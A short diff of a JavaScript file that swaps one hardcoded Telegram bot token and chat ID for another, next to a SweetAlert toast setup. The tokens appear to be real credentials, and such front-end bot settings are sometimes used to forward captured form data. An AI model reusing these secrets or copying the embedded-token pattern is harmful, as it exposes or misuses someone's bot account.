@@ -1,5 +1,5 @@
-const botToken = "8124693693:AAEKAE8sxCTVpIgb1WtgYxU7NERuOPLW9m0";
-const chatId = "7408597280";
+const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY";
+const chatId = "6124038392";
 
 const Toast = Swal.mixin({
   toast: true,
